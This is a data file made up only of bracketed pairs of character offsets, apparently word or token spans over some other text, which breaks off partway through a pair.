[5139, 5149], [5149, 5150], [5151, 5154], [5155, 5160], [5161, 5170], [5171, 5175], [5176, 5179], [5180, 5182], [5183, 5190], [5191, 5193], [5194, 5197], [5198, 5202], [5203, 5205], [5206, 5212], [5213, 5215], [5216, 5224], [5225, 5229], [5230, 5234], [5235, 5238], [5239, 5241], [5242, 5246], [5246, 5247], [5248, 5250], [5251, 5259], [5259, 5260], [5261, 5263], [5264, 5275], [5276, 5285], [5286, 5288], [5289, 5293], [5294, 5299], [5300, 5303], [5304, 5309], [5310, 5312], [5313, 5322], [5323, 5328], [5329, 5331], [5332, 5337], [5338, 5345], [5346, 5349], [5350, 5358], [5359, 5365], [5366, 5373], [5374, 5380], [5381, 5384], [5385, 5392], [5393, 5395], [5396, 5403], [5404, 5413], [5414, 5416], [5417, 5425], [5425, 5426], [5427, 5429], [5430, 5441], [5442, 5444], [5445, 5455], [5456, 5461], [5461, 5462], [5463, 5464], [5465, 5472], [5473, 5477], [5478, 5485], [5486, 5492], [5493, 5497], [5498, 5499], [5500, 5512], [5513, 5521], [5522, 5526], [5527, 5531], [5532, 5534], [5535, 5538], [5539, 5545], [5546, 5550], [5551, 5559], [5559, 5560], [5561, 5566], [5567, 5572], [5573, 5575], [5576, 5578], [5579, 5581], [5582, 5588], [5589, 5591], [5592, 5596], [5597, 5601], [5602, 5606], [5606, 5607], [5608, 5612], [5613, 5616], [5617, 5625], [5626, 5629], [5630, 5639], [5640, 5643], [5644, 5655], [5656, 5662], [5663, 5665], [5666, 5672], [5672, 5673], [5674, 5677], [5678, 5684], [5685, 5693], [5694, 5702], [5703, 5707], [5708, 5710], [5711, 5716], [5717, 5719], [5720, 5725], [5726, 5735], [5735, 5736], [5737, 5746], [5747, 5758], [5759, 5761], [5762, 5765], [5766, 5774], [5774, 5775], [5776, 5781], [5782, 5786], [5787, 5789], [5790, 5797], [5798, 5801], [5802, 5804], [5805, 5808], [5808, 5809], [5810, 5812], [5813, 5821], [5822, 5825], [5826, 5835], [5836, 5838], [5839, 5842], [5843, 5854], [5855, 5861], [5862, 5864], [5865, 5869], [5870, 5871], [5872, 5875], [5875, 5876], [5877, 5882], [5883, 5885], [5886, 5890], [5891, 5893], [5894, 5898], [5899, 5904], [5905, 5912], [5913, 5922], [5923, 5925], [5926, 5927], [5928, 5938], [5939, 5945], [5945, 5946], [5947, 5951], [5952, 5955], [5956, 5962], [5963, 5965], [5966, 5973], [5973, 5974], [5975, 5977], [5978, 5981], [5982, 5986], [5987, 5991], [5992, 5997], [5998, 6007], [6008, 6012], [6013, 6016], [6017, 6028], [6029, 6032], [6033, 6042], [6043, 6051], [6052, 6062], [6062, 6063], [6064, 6068], [6069, 6077], [6078, 6093], [6094, 6097], [6098, 6108], [6108, 6109], [6110, 6115], [6116, 6125], [6126, 6130], [6131, 6133], [6134, 6140], [6141, 6143], [6144, 6151], [6152, 6161], [6162, 6168], [6169, 6172], [6173, 6176], [6177, 6182], [6183, 6191], [6192, 6194], [6195, 6198], [6199, 6205], [6205, 6206], [6207, 6209], [6210, 6218], [6219, 6225], [6226, 6234], [6235, 6244], [6245, 6246], [6247, 6252], [6253, 6261], [6262, 6264], [6265, 6272], [6273, 6274], [6275, 6280], [6281, 6285], [6286, 6288], [6288, 6289], [6290, 6293], [6294, 6299], [6300, 6302], [6303, 6305], [6306, 6312], [6313, 6317], [6318, 6320], [6321, 6327], [6328, 6334], [6335, 6338], [6339, 6350], [6351, 6357], [6358, 6360], [6361, 6363], [6364, 6370], [6371, 6375], [6376, 6379], [6380, 6389], [6390, 6392], [6393, 6396], [6397, 6401], [6402, 6408], [6408, 6409], [6410, 6414], [6415, 6418], [6419, 6428], [6429, 6432], [6433, 6442], [6443, 6445], [6446, 6449], [6450, 6452], [6453, 6457], [6458, 6466], [6467, 6474], [6474, 6475], [6476, 6478], [6479, 6486], [6487, 6495], [6496, 6499], [6500, 6502], [6503, 6509], [6510, 6512], [6513, 6519], [6520, 6527], [6528, 6531], [6532, 6540], [6541, 6548], [6549, 6551], [6552, 6555], [6556, 6562], [6563, 6566], [6566, 6567], [6568, 6578], [6579, 6582], [6583, 6590], [6591, 6595], [6596, 6604], [6605, 6606], [6607, 6612], [6613, 6620], [6621, 6628], [6629, 6631], [6632, 6633], [6634, 6642], [6642, 6643], [6644, 6647], [6648, 6652], [6653, 6655], [6656, 6660], [6661, 6665], [6666, 6669], [6670, 6680], [6681, 6692], [6693, 6699], [6700, 6701], [6701, 6703], [6703, 6705], [6706, 6708], [6709, 6710], [6711, 6719], [6720, 6725], [6726, 6730], [6731, 6733], [6734, 6741], [6742, 6745], [6745, 6747], [6748, 6751], [6752, 6761], [6762, 6767], [6768, 6774], [6775, 6778], [6779, 6783], [6784, 6790], [6791, 6799], [6800, 6809], [6810, 6812], [6813, 6816], [6816, 6817], [6819, 6823], [6824, 6830], [6831, 6835], [6836, 6838], [6839, 6842], [6843, 6850], [6851, 6854], [6855, 6858], [6859, 6868], [6869, 6878], [6879, 6884], [6885, 6887], [6888, 6893], [6894, 6906], [6907, 6910], [6911, 6914], [6915, 6922], [6923, 6927], [6928, 6932], [6933, 6935], [6936, 6940], [6941, 6943], [6944, 6951], [6951, 6952], [6953, 6955], [6956, 6961], [6962, 6964], [6965, 6971], [6972, 6982], [6983, 6984], [6985, 6989], [6990, 6996], [6996, 6997], [6998, 7003], [7004, 7009], [7010, 7012], [7013, 7022], [7023, 7026], [7027, 7031], [7032, 7040], [7040, 7041], [7042, 7045], [7046, 7052], [7052, 7053], [7054, 7057], [7058, 7067], [7068, 7076], [7077, 7081], [7082, 7090], [7091, 7092], [7093, 7103], [7104, 7111], [7112, 7114], [7115, 7116], [7117, 7123], [7124, 7128], [7129, 7137], [7137, 7138], [7143, 7146], [7152, 7155], [7155, 7156], [7157, 7161], [7161, 7162], [7162, 7166], [7166, 7167], [7169, 7179], [7179, 7180], [7186, 7189], [7195, 7198], [7198, 7199], [7200, 7205], [7211, 7215], [7220, 7222], [7222, 7223], [7223, 7250], [7256, 7259], [7265, 7268], [7268, 7269], [7270, 7274], [7274, 7275], [7275, 7278], [7278, 7279], [7285, 7289], [7294, 7297], [7297, 7298], [7299, 7302], [7308, 7311], [7317, 7322], [7323, 7333], [7339, 7342], [7344, 7353], [7353, 7354], [7360, 7363], [7364, 7370], [7371, 7377], [7378, 7386], [7387, 7390], [7391, 7395], [7396, 7398], [7399, 7402], [7403, 7408], [7409, 7413], [7413, 7414], [7415, 7418], [7419, 7424], [7425, 7428], [7429, 7433], [7434, 7441], [7442, 7445], [7446, 7448], [7449, 7453], [7454, 7458], [7459, 7462], [7463, 7466], [7467, 7472], [7473, 7475], [7476, 7479], [7480, 7491], [7492, 7498], [7499, 7503], [7504, 7507], [7508, 7512], [7513, 7519], [7520, 7522], [7523, 7529], [7530, 7534], [7535, 7539], [7540, 7543], [7543, 7544], [7545, 7550], [7551, 7554], [7555, 7558], [7559, 7564], [7565, 7567], [7568, 7571], [7572, 7583], [7584, 7591], [7592, 7596], [7597, 7599], [7600, 7610], [7611, 7613], [7614, 7621], [7622, 7626], [7627, 7634], [7635, 7642], [7642, 7643], [7644, 7646], [7647, 7651], [7652, 7654], [7655, 7659], [7660, 7664], [7665, 7667], [7668, 7672], [7673, 7676], [7677, 7682], [7683, 7689], [7690, 7699], [7700, 7703], [7704, 7711], [7712, 7716], [7717, 7718], [7718, 7720], [7720, 7721], [7722, 7724], [7725, 7735], [7736, 7737], [7738, 7744], [7744, 7746], [7747, 7750], [7751, 7755], [7756, 7763], [7764, 7768], [7769, 7776], [7777, 7779], [7780, 7784], [7785, 7797], [7798, 7802], [7803, 7806], [7807, 7812], [7813, 7819], [7820, 7822], [7823, 7826], [7827, 7832], [7833, 7841], [7842, 7846], [7847, 7851], [7852, 7858], [7858, 7859], [7860, 7864], [7865, 7868], [7869, 7873], [7874, 7881], [7881, 7882], [7883, 7884], [7885, 7888], [7889, 7897], [7898, 7900], [7901, 7907], [7908, 7910], [7911, 7917], [7918, 7922], [7923, 7927], [7928, 7931], [7932, 7940], [7941, 7947], [7948, 7951], [7952, 7954], [7955, 7958], [7959, 7966], [7967, 7969], [7970, 7973], [7974, 7976], [7977, 7980], [7981, 7985], [7985, 7986], [7987, 7988], [7989, 7992], [7993, 8002], [8003, 8005], [8006, 8009], [8010, 8014], [8015, 8020], [8021, 8026], [8026, 8027], [8028, 8033], [8034, 8041], [8042, 8045], [8046, 8057], [8058, 8064], [8065, 8067], [8068, 8074], [8074, 8075], [8076, 8078], [8079, 8083], [8084, 8086], [8087, 8092], [8093, 8100], [8101, 8105], [8106, 8114], [8115, 8117], [8118, 8123], [8124, 8127], [8128, 8134], [8135, 8142], [8142, 8143], [8144, 8153], [8154, 8156], [8157, 8160], [8161, 8170], [8171, 8177], [8177, 8178], [8180, 8183], [8184, 8188], [8189, 8195], [8196, 8198], [8199, 8205], [8206, 8210], [8210, 8211], [8212, 8220], [8220, 8221], [8221, 8229], [8230, 8232], [8233, 8236], [8237, 8241], [8242, 8249], [8250, 8252], [8253, 8256], [8257, 8261], [8262, 8269], [8269, 8270], [8271, 8276], [8277, 8279], [8280, 8286], [8287, 8289], [8290, 8296], [8297, 8301], [8302, 8306], [8307, 8310], [8311, 8315], [8316, 8323], [8324, 8325], [8325, 8328], [8328, 8330], [8331, 8335], [8336, 8339], [8340, 8348], [8349, 8353], [8354, 8361], [8361, 8362], [8363, 8365], [8366, 8372], [8373, 8375], [8376, 8379], [8380, 8385], [8386, 8390], [8391, 8393], [8394, 8397], [8398, 8408], [8409, 8416], [8417, 8421], [8422, 8425], [8426, 8433], [8434, 8438], [8439, 8451], [8452, 8456], [8457, 8460], [8460, 8461], [8462, 8467], [8468, 8470], [8471, 8475], [8476, 8482], [8483, 8485], [8486, 8489], [8490, 8495], [8496, 8504], [8504, 8505], [8506, 8508], [8509, 8512], [8513, 8517], [8518, 8522], [8523, 8532], [8533, 8536], [8537, 8543], [8544, 8551], [8552, 8555], [8556, 8560], [8561, 8565], [8566, 8568], [8569, 8576], [8577, 8578], [8579, 8586], [8587, 8589], [8590, 8596], [8597, 8601], [8602, 8606], [8607, 8610], [8611, 8619], [8620, 8623], [8624, 8627], [8628, 8638], [8639, 8646], [8647, 8650], [8651, 8657], [8658, 8666], [8666, 8667], [8668, 8672], [8673, 8683], [8684, 8694], [8695, 8702], [8703, 8707], [8708, 8716], [8716, 8717], [8718, 8720], [8721, 8723], [8724, 8735], [8736, 8738], [8739, 8743], [8744, 8746], [8747, 8750], [8751, 8757], [8758, 8766], [8767, 8774], [8775, 8777], [8778, 8783], [8784, 8788], [8789, 8796], [8797, 8800], [8801, 8810], [8811, 8815], [8816, 8819], [8820, 8825], [8826, 8835], [8835, 8836], [8837, 8844], [8844, 8845], [8846, 8849], [8850, 8853], [8854, 8858], [8859, 8861], [8862, 8869], [8869, 8870], [8871, 8873], [8874, 8879], [8880, 8883], [8884, 8894], [8895, 8906], [8907, 8911], [8912, 8916], [8917, 8918], [8919, 8925], [8926, 8933], [8934, 8942], [8943, 8948], [8949, 8956], [8957, 8960], [8961, 8969], [8969, 8970], [8971, 8973], [8974, 8979], [8980, 8983], [8984, 8986], [8987, 8990], [8991, 8995], [8996, 9003], [9003, 9004], [9005, 9011], [9012, 9019], [9020, 9032], [9033, 9037], [9038, 9044], [9044, 9045], [9046, 9051], [9052, 9056], [9057, 9059], [9060, 9062], [9063, 9073], [9074, 9075], [9076, 9088], [9089, 9094], [9095, 9097], [9098, 9105], [9106, 9117], [9118, 9122], [9123, 9125], [9126, 9135], [9136, 9138], [9139, 9147], [9148, 9152], [9153, 9160], [9160, 9161], [9162, 9171], [9172, 9175], [9176, 9179], [9180, 9186], [9187, 9192], [9193, 9197], [9198, 9202], [9203, 9206], [9207, 9217], [9218, 9229], [9230, 9232], [9233, 9238], [9239, 9241], [9242, 9250], [9251, 9255], [9256, 9259], [9260, 9263], [9264, 9267], [9268, 9270], [9271, 9279], [9280, 9282], [9283, 9286], [9286, 9287], [9288, 9293], [9294, 9296], [9297, 9299], [9300, 9302], [9303, 9310], [9310, 9311], [9312, 9317], [9318, 9321], [9321, 9322], [9323, 9325], [9326, 9332], [9333, 9337], [9338, 9341], [9342, 9344], [9345, 9351], [9352, 9360], [9360, 9361], [9362, 9364], [9365, 9370], [9371, 9372], [9373, 9383], [9384, 9386], [9387, 9393], [9393, 9394], [9395, 9402], [9403, 9406], [9407, 9417], [9417, 9418], [9419, 9428], [9429, 9432], [9433, 9439], [9440, 9447], [9448, 9451], [9452, 9458], [9459, 9468], [9468, 9469], [9470, 9471], [9471, 9472], [9472, 9476], [9477, 9479], [9480, 9486], [9488, 9489], [9489, 9490], [9490, 9494], [9495, 9496], [9498, 9499], [9499, 9500], [9500, 9504], [9505, 9506], [9508, 9509], [9510, 9518], [9519, 9526], [9527, 9531], [9532, 9536], [9538, 9540], [9541, 9549], [9549, 9550], [9550, 9558], [9559, 9567], [9567, 9568], [9568, 9576], [9577, 9581], [9581, 9582], [9582, 9588], [9589, 9591], [9591, 9592], [9592, 9600], [9601, 9606], [9607, 9608], [9608, 9611], [9611, 9612], [9612, 9620], [9621, 9639], [9639, 9649], [9649, 9660], [9660, 9661], [9661, 9662], [9663, 9664], [9665, 9668], [9668, 9669], [9672, 9674], [9675, 9683], [9683, 9684], [9684, 9692], [9693, 9701], [9701, 9702], [9702, 9710], [9711, 9715], [9715, 9716], [9716, 9720], [9720, 9721], [9721, 9725], [9726, 9728], [9728, 9729], [9729, 9767], [9767, 9768], [9768, 9771], [9772, 9773], [9774, 9776], [9776, 9777], [9780, 9782], [9783, 9784], [9784, 9790], [9791, 9799], [9799, 9800], [9801, 9818], [9819, 9823], [9823, 9824], [9824, 9835], [9835, 9836], [9836, 9840], [9841, 9843], [9843, 9844], [9844, 9905], [9905, 9906], [9906, 9909], [9910, 9911], [9912, 9914], [9914, 9915], [9918, 9920], [9921, 9929], [9929, 9930], [9930, 9938], [9939, 9947], [9947, 9950], [9950, 9956], [9957, 9961], [9961, 9962], [9962, 9984], [9984, 9985], [9985, 9990], [9991, 9993], [9993, 9994], [9994, 10055], [10055, 10056], [10056, 10059], [10060, 10061], [10062, 10065], [10065, 10066], [10069, 10071], [10072, 10080], [10080, 10081], [10081, 10089], [10090, 10098], [10098, 10103], [10103, 10107], [10108, 10116], [10116, 10117], [10117, 10136], [10136, 10137], [10137, 10141], [10143, 10145], [10146, 10154], [10154, 10155], [10155, 10163], [10164, 10172], [10172, 10173], [10173, 10181], [10182, 10187], [10187, 10188], [10188, 10206], [10206, 10207], [10207, 10211], [10213, 10214], [10214, 10215], [10215, 10219], [10220, 10222], [10223, 10231], [10231, 10232], [10232, 10240], [10241, 10243], [10245, 10253], [10253, 10254], [10254, 10262], [10263, 10271], [10271, 10272], [10272, 10280], [10283, 10284], [10284, 10285], [10285, 10289], [10290, 10292], [10293, 10301], [10301, 10302], [10302, 10310], [10311, 10323], [10325, 10326], [10326, 10327], [10327, 10331], [10332, 10334], [10335, 10343], [10343, 10344], [10344, 10352], [10353, 10355], [10357, 10365], [10365, 10366], [10366, 10374], [10375, 10383], [10383, 10384], [10384, 10393], [10395, 10396], [10396, 10397], [10397, 10401], [10402, 10403], [10405, 10406], [10406, 10410], [10410, 10411], [10411, 10414], [10414, 10416], [10417, 10425], [10426, 10431], [10432, 10439], [10440, 10442], [10443, 10448], [10449, 10455], [10456, 10463], [10464, 10465], [10466, 10470], [10471, 10479], [10480, 10484], [10485, 10491], [10492, 10498], [10499, 10503], [10505, 10512], [10512, 10513], [10514, 10518], [10519, 10559], [10560, 10566], [10567, 10572], [10573, 10582], [10584, 10588], [10588, 10589], [10589, 10595], [10595, 10596], [10596, 10600], [10600, 10601], [10603, 10611], [10611, 10612], [10612, 10620], [10621, 10623], [10624, 10627], [10628, 10637], [10638, 10642], [10643, 10646], [10647, 10649], [10650, 10658], [10659, 10661], [10662, 10665], [10666, 10678], [10679, 10683], [10684, 10687], [10688, 10690], [10691, 10698], [10699, 10701], [10702, 10704], [10705, 10708], [10709, 10720], [10721, 10729], [10730, 10734], [10735, 10736], [10737, 10743], [10744, 10749], [10750, 10759], [10760, 10769], [10770, 10772], [10773, 10775], [10776, 10783], [10784, 10790], [10791, 10798], [10798, 10799], [10800, 10802], [10803, 10806], [10807, 10809], [10810, 10811], [10812, 10829], [10830, 10840], [10840, 10841], [10842, 10844], [10845, 10850], [10851, 10853], [10854, 10861], [10862, 10865], [10866, 10871], [10872, 10877], [10878, 10880], [10881, 10886], [10887, 10891], [10892, 10894], [10895, 10900], [10901, 10903], [10904, 10908], [10909, 10919], [10920, 10924], [10925, 10931], [10932, 10937], [10938, 10941], [10942, 10944], [10945, 10953], [10954, 10955], [10956, 10963], [10964, 10977], [10977, 10978], [10979, 10981], [10982, 10985], [10986, 10992], [10993, 10996], [10997, 11004], [11005, 11007], [11008, 11014], [11015, 11024], [11025, 11027], [11028, 11029], [11030, 11034], [11035, 11044], [11045, 11058], [11059, 11061], [11062, 11065], [11066, 11077], [11078, 11082], [11083, 11085], [11086, 11095], [11096, 11109], [11110, 11114], [11115, 11118], [11119, 11130], [11131, 11133], [11134, 11142], [11142, 11143], [11144, 11148], [11149, 11151], [11152, 11155], [11156, 11159], [11160, 11167], [11168, 11171], [11172, 11175], [11176, 11189], [11189, 11190], [11191, 11192], [11193, 11199], [11200, 11207], [11208, 11212], [11213, 11222], [11223, 11225], [11226, 11229], [11230, 11235], [11235, 11236], [11237, 11244], [11245, 11247], [11248, 11250], [11251, 11259], [11260, 11264], [11265, 11269], [11270, 11272], [11273, 11277], [11278, 11285], [11286, 11290], [11290, 11291], [11292, 11294], [11295, 11299], [11300, 11306], [11307, 11310], [11311, 11317], [11318, 11320], [11321, 11325], [11326, 11328], [11329, 11334], [11335, 11337], [11338, 11341], [11342, 11346], [11347, 11353], [11354, 11359], [11360, 11363], [11364, 11369], [11370, 11371], [11371, 11374], [11375, 11379], [11379, 11380], [11381, 11389], [11390, 11397], [11397, 11398], [11399, 11401], [11402, 11411], [11412, 11419], [11419, 11420], [11421, 11428], [11429, 11431], [11432, 11437], [11438, 11439], [11440, 11446], [11447, 11451], [11452, 11458], [11459, 11467], [11467, 11468], [11469, 11472], [11473, 11476], [11477, 11481], [11482, 11484], [11485, 11492], [11492, 11493], [11494, 11496], [11497, 11502], [11503, 11505], [11506, 11509], [11510, 11511], [11512, 11518], [11519, 11525], [11526, 11530], [11531, 11539], [11540, 11544], [11545, 11548], [11549, 11556], [11557, 11560], [11561, 11569], [11570, 11576], [11577, 11587], [11587, 11588], [11589, 11591], [11592, 11596], [11597, 11599], [11600, 11603], [11604, 11613], [11614, 11618], [11619, 11621], [11622, 11625], [11626, 11633], [11633, 11634], [11635, 11637], [11638, 11643], [11644, 11646], [11647, 11653], [11654, 11657], [11658, 11668], [11669, 11673], [11674, 11681], [11681, 11682], [11683, 11685], [11686, 11690], [11691, 11697], [11698, 11701], [11702, 11707], [11708, 11715], [11716, 11719], [11720, 11729], [11730, 11733], [11734, 11738], [11739, 11746], [11747, 11749], [11750, 11751], [11752, 11758], [11759, 11765], [11766, 11770], [11771, 11774], [11775, 11780], [11780, 11781], [11782, 11786], [11787, 11789], [11790, 11794], [11795, 11803], [11804, 11807], [11808, 11812], [11813, 11820], [11821, 11828], [11828, 11829], [11830, 11832], [11833, 11840], [11841, 11844], [11845, 11852], [11853, 11855], [11856, 11859], [11860, 11867], [11868, 11871], [11872, 11874], [11875, 11879], [11880, 11882], [11883, 11889], [11890, 11895], [11896, 11900], [11901, 11904], [11905, 11914], [11914, 11915], [11916, 11920], [11921, 11923], [11924, 11928], [11929, 11931], [11932, 11939], [11940, 11944], [11945, 11948], [11949, 11956], [11957, 11960], [11961, 11968], [11969, 11972], [11973, 11976], [11977, 11986], [11987, 11989], [11990, 11993], [11994, 12002], [12003, 12010], [12011, 12017], [12018, 12021], [12022, 12033], [12034, 12040], [12040, 12041], [12042, 12048], [12049, 12058], [12059, 12062], [12063, 12067], [12068, 12075], [12076, 12078], [12079, 12083], [12084, 12090], [12090, 12091], [12092, 12097], [12098, 12103], [12104, 12114], [12115, 12118], [12119, 12124], [12125, 12131], [12132, 12134], [12135, 12142], [12143, 12145], [12146, 12153], [12154, 12157], [12158, 12167], [12167, 12168], [12171, 12172], [12172, 12173], [12173, 12219], [12219, 12220], [12220, 12223], [12227, 12230], [12231, 12237], [12237, 12238], [12240, 12244], [12244, 12245], [12245, 12248], [12249, 12254], [12255, 12258], [12259, 12263], [12264, 12268], [12269, 12278], [12279, 12287], [12288, 12292], [12293, 12302], [12306, 12309], [12310, 12317], [12318, 12319], [12320, 12327], [12327, 12328], [12330, 12334], [12334, 12335], [12335, 12338], [12339, 12351], [12352, 12368], [12369, 12385], [12386, 12387], [12387, 12390], [12390, 12391], [12391, 12394], [12395, 12396], [12396, 12397], [12398, 12402], [12402, 12403], [12407, 12410], [12411, 12418], [12419, 12420], [12421, 12433], [12433, 12434], [12436, 12440], [12440, 12441], [12441, 12444], [12445, 12457], [12458, 12474], [12475, 12491], [12492, 12493], [12493, 12501], [12501, 12502], [12502, 12505], [12505, 12506], [12509, 12516], [12517, 12520], [12521, 12526], [12527, 12533], [12534, 12537], [12538, 12549], [12550, 12557], [12558, 12562], [12563, 12573], [12573, 12574], [12575, 12576], [12577, 12584], [12585, 12587], [12588, 12591], [12592, 12603], [12604, 12610], [12611, 12612], [12612, 12616], [12616, 12617], [12618, 12624], [12624, 12625], [12626, 12629], [12630, 12638], [12639, 12646], [12646, 12647], [12648, 12651], [12652, 12659], [12660, 12663], [12664, 12671], [12672, 12675], [12676, 12679], [12680, 12689], [12689, 12690], [12691, 12694], [12695, 12701], [12702, 12707], [12708, 12711], [12712, 12718], [12719, 12728], [12729, 12732], [12733, 12737], [12738, 12741], [12742, 12744], [12745, 12747], [12748, 12754], [12755, 12763], [12764, 12766], [12767, 12773], [12774, 12777], [12778, 12789], [12790, 12793], [12794, 12795], [12795, 12797], [12798, 12801], [12802, 12813], [12814, 12816], [12817, 12825], [12826, 12830], [12831, 12833], [12833, 12835], [12836, 12841], [12842, 12849], [12850, 12854], [12855, 12859], [12860, 12864], [12865, 12867], [12868, 12869], [12870, 12876], [12877, 12881], [12882, 12889], [12889, 12890], [12891, 12893], [12894, 12896], [12897, 12905], [12906, 12908], [12909, 12918], [12919, 12922], [12923, 12930], [12931, 12936], [12937, 12944], [12945, 12955], [12955, 12956], [12957, 12962], [12963, 12968], [12969, 12976], [12977, 12980], [12981, 12982], [12982, 12984], [12985, 12989], [12990, 12992], [12993, 12996], [12997, 13003], [13004, 13011], [13012, 13014], [13015, 13018], [13019, 13027], [13027, 13028], [13029, 13032], [13033, 13037], [13038, 13045], [13046, 13049], [13050, 13063], [13064, 13072], [13073, 13077], [13078, 13081], [13082, 13090], [13091, 13097], [13097, 13098], [13101, 13106], [13107, 13113], [13114, 13115], [13117, 13123], [13123, 13124], [13130, 13134], [13134, 13135], [13136, 13137], [13137, 13138], [13144, 13147], [13148, 13150], [13150, 13158], [13158, 13160], [13160, 13164], [13164, 13165], [13166, 13167], [13167, 13169], [13173, 13179], [13179, 13180], [13186, 13193], [13194, 13198], [13199, 13206], [13206, 13207], [13207, 13211], [13211, 13212], [13213, 13215], [13215, 13216], [13217, 13218], [13228, 13236], [13236, 13237], [13237, 13238], [13238, 13240], [13248, 13249], [13251, 13253], [13256, 13259], [13260, 13269], [13270, 13276], [13277, 13281], [13282, 13287], [13288, 13290], [13291, 13297], [13298, 13301], [13302, 13310], [13311, 13314], [13315, 13320], [13321, 13327], [13328, 13335], [13336, 13338], [13339, 13342], [13343, 13350], [13351, 13359], [13360, 13361], [13362, 13369], [13370, 13376], [13377, 13382], [13383, 13387], [13388, 13390], [13391, 13392], [13393, 13400], [13401, 13409], [13410, 13417], [13418, 13422], [13423, 13425], [13426, 13429], [13430, 13435], [13436, 13438], [13439, 13445], [13446, 13449], [13450, 13453], [13454, 13456], [13457, 13461], [13461, 13462], [13463, 13465], [13466, 13471], [13472, 13475], [13476, 13483], [13483, 13484], [13485, 13489], [13489, 13490], [13491, 13494], [13495, 13503], [13504, 13509], [13510, 13512], [13513, 13525], [13526, 13528], [13529, 13532], [13533, 13537], [13538, 13545], [13546, 13553], [13554, 13556], [13557, 13559], [13560, 13564], [13565, 13571], [13572, 13574], [13575, 13581], [13582, 13587], [13588, 13592], [13593, 13596], [13597, 13604], [13604, 13605], [13606, 13612], [13613, 13614], [13615, 13621], [13622, 13626], [13627, 13629], [13630, 13633], [13634, 13641], [13642, 13644], [13645, 13648], [13649, 13661], [13662, 13669], [13670, 13671], [13672, 13675], [13676, 13687], [13688, 13695], [13695, 13696], [13698, 13705], [13706, 13714], [13717, 13725], [13726, 13730], [13731, 13734], [13735, 13741], [13742, 13744], [13745, 13748], [13749, 13755], [13756, 13760], [13760, 13761], [13762, 13765], [13766, 13770], [13771, 13778], [13778, 13779], [13780, 13790], [13791, 13793], [13794, 13797], [13797, 13798], [13799, 13801], [13802, 13807], [13808, 13814], [13815, 13817], [13818, 13821], [13822, 13827], [13828, 13831], [13832, 13836], [13837, 13842], [13843, 13847], [13848, 13851], [13851, 13852], [13853, 13857], [13857, 13858], [13859, 13862], [13863, 13868], [13869, 13871], [13872, 13878], [13879, 13883], [13884, 13888], [13889, 13892], [13893, 13895], [13896, 13908], [13909, 13912], [13913, 13918], [13919, 13923], [13924, 13927], [13927, 13928], [13929, 13933], [13934, 13939], [13940, 13944], [13945, 13947], [13948, 13951], [13952, 13955], [13956, 13964], [13965, 13972], [13973, 13981], [13982, 13984], [13985, 13988], [13989, 14000], [14001, 14007], [14007, 14008], [14009, 14013], [14014, 14016], [14017, 14021], [14022, 14023], [14024, 14027], [14028, 14029], [14030, 14033], [14034, 14039], [14040, 14048], [14049, 14057], [14058, 14060], [14061, 14073], [14074, 14076], [14077, 14083], [14084, 14087], [14088, 14092], [14093, 14096], [14097, 14101], [14102, 14109], [14110, 14113], [14114, 14119], [14120, 14124], [14125, 14128], [14128, 14129], [14130, 14132], [14133, 14138], [14139, 14143], [14144, 14152], [14152, 14153], [14154, 14157], [14158, 14168], [14169, 14180], [14181, 14185], [14186, 14190], [14191, 14195], [14196, 14198], [14199, 14204], [14205, 14212], [14213, 14217], [14218, 14220], [14221, 14225], [14226, 14235], [14236, 14239], [14240, 14250], [14251, 14255], [14256, 14259], [14260, 14267], [14268, 14272], [14272, 14273], [14274, 14280], [14281, 14288], [14289, 14292], [14293, 14297], [14298, 14306], [14307, 14313], [14314, 14316], [14317, 14320], [14321, 14327], [14328, 14333], [14333, 14334], [14335, 14340], [14341, 14344], [14345, 14347], [14348, 14351], [14352, 14355], [14356, 14359], [14360, 14362], [14363, 14370], [14371, 14374], [14375, 14379], [14380, 14389], [14390, 14392], [14393, 14398], [14399, 14401], [14402, 14406], [14407, 14411], [14412, 14421], [14421, 14422], [14425, 14426], [14426, 14427], [14427, 14429], [14430, 14434], [14434, 14435], [14435, 14438], [14439, 14451], [14452, 14468], [14469, 14485], [14486, 14487], [14487, 14490], [14490, 14491], [14491, 14494], [14495, 14496], [14496, 14497], [14498, 14502], [14502, 14503], [14506, 14513], [14514, 14517], [14518, 14521], [14522, 14533], [14534, 14538], [14539, 14542], [14543, 14553], [14554, 14558], [14559, 14562], [14563, 14568], [14569, 14576], [14577, 14579], [14580, 14588], [14589, 14592], [14593, 14602], [14603, 14613], [14613, 14614], [14614, 14626], [14627, 14629], [14630, 14631], [14632, 14639], [14640, 14646], [14647, 14650], [14651, 14654], [14655, 14666], [14667, 14673], [14673, 14690], [14691, 14693], [14694, 14697], [14698, 14705], [14706, 14714], [14715, 14717], [14718, 14726], [14727, 14745], [14746, 14751], [14752, 14754], [14755, 14758], [14759, 14766], [14767, 14773], [14774, 14781], [14781, 14782], [14783, 14785], [14786, 14787], [14788, 14793], [14794, 14802], [14803, 14805], [14806, 14810], [14811, 14814], [14815, 14822], [14823, 14829], [14830, 14838], [14838, 14839], [14840, 14844], [14845, 14849], [14850, 14853], [14854, 14860], [14861, 14870], [14871, 14874], [14875, 14881], [14882, 14884], [14885, 14898], [14899, 14905], [14905, 14906], [14907, 14911], [14912, 14919], [14919, 14920], [14921, 14924], [14925, 14936], [14937, 14942], [14943, 14954], [14954, 14955], [14956, 14964], [14965, 14967], [14968, 14970], [14971, 14977], [14978, 14981], [14982, 14990], [14991, 14993], [14994, 14996], [14996, 14997], [14998, 15004], [15005, 15010], [15011, 15013], [15013, 15014], [15015, 15017], [15018, 15024], [15025, 15032], [15033, 15041], [15042, 15044], [15045, 15051], [15052, 15056], [15057, 15060], [15061, 15067], [15068, 15070], [15071, 15079], [15080, 15087], [15088, 15092], [15093, 15098], [15099, 15102], [15103, 15110], [15110, 15111], [15113, 15122], [15123, 15127], [15128, 15131], [15132, 15134], [15135, 15142], [15143, 15147], [15148, 15155], [15156, 15164], [15165, 15170], [15171, 15174], [15175, 15181], [15182, 15193], [15194, 15200], [15200, 15201], [15202, 15209], [15210, 15218], [15219, 15227], [15228, 15232], [15233, 15236], [15237, 15239], [15240, 15248], [15249, 15252], [15253, 15257], [15258, 15261], [15262, 15276], [15277, 15284], [15284, 15285], [15286, 15293], [15294, 15298], [15299, 15302], [15303, 15313], [15314, 15318], [15319, 15321], [15322, 15330], [15331, 15334], [15335, 15338], [15339, 15345], [15346, 15354], [15355, 15359], [15360, 15363], [15363, 15364], [15365, 15369], [15370, 15378], [15379, 15382], [15383, 15394], [15394, 15395], [15396, 15400], [15401, 15404], [15405, 15413], [15414, 15416], [15417, 15425], [15425, 15426], [15427, 15429], [15430, 15435], [15436, 15437], [15438, 15448], [15449, 15451], [15452, 15455], [15456, 15460], [15461, 